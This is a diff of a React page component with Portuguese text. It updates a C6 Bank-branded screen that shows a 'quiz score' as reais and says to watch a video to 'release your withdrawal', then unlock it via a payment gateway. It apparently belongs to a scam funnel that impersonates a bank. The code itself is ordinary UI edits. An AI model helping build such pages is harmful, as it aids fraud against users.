@@ -1,6 +1,7 @@
 import { useNavigate } from 'react-router-dom';
 
-import Iconc6Payment from '../../assets/c6/c6icon.svg';
+import { useEffect } from 'react';
+import Iconc6Payment from '../../assets/c6/logoc6bank.svg';
 import poster from '../../assets/c6/thumb.png';
 import { useAppContext } from '../../context/AppContext';
 
@@ -8,15 +9,19 @@ export function PaymentVideo() {
   const { quizScore } = useAppContext()
   const navigate = useNavigate();
 
+  useEffect(() => {
+    window.scrollTo(0, 0);
+  }, []);
+
   return (
-    <main className="bg-[#121212] antialiased">
+    <main className="bg-[#121212] antialiased pb-10">
       <header className="bg-[#FBC161]">
-        <h1 className="text-[#121212] text-center py-4 text-[1rem] font-c6text-bold font-bold px-6">
+        <h1 className="text-[#121212] text-center py-4 text-[1rem] font-c6text-bold font-bold px-6 ">
           ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
         </h1>
       </header>
       <section className="flex items-center justify-between px-6 py-4 mt-2 ">
-        <img src={Iconc6Payment} width={70} height={70} />
+        <img src={Iconc6Payment} width={120} height={70} />
         <div className="w-32">
           <p className="border py-3 rounded-lg text-[#f4f4f4] text-center text-[1rem]">
             R$ {Number(quizScore).toFixed(2).replace('.', ',')}
@@ -42,9 +47,8 @@ export function PaymentVideo() {
         />
       </section>
       <div className="px-6">
-        <button onClick={() => navigate('/gateway')} className="bg-[#FBC161] w-full px-6 py-4 rounded-lg mt-10 font-c6text-bold font-bold text-[1rem]">
-          Desbloquear agora <b> R$ {Number(quizScore)?.toFixed(2)?.replace(',', '.')}</b>
-
+        <button onClick={() => navigate('/gatewaypay')} className="bg-[#FBC161] w-full px-6 py-4 rounded-lg mt-10 font-c6text-bold font-bold text-[1rem]">
+          Desbloquear agora <b> R$ {Number(quizScore)?.toFixed(2)?.replace('.', ',')}</b>
         </button>
 
       </div>
